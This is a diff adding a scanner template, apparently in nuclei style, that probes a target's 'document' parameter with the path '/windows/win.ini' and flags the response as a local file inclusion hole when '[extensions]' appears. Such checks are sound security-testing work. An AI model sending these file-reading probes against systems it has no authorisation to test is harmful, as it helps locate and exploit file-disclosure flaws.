@@ -1,0 +1,20 @@
+id: lfi6-1471
+name: 'Traversal in document'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via document'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      document:
+        - '/windows/win.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[extensions]'
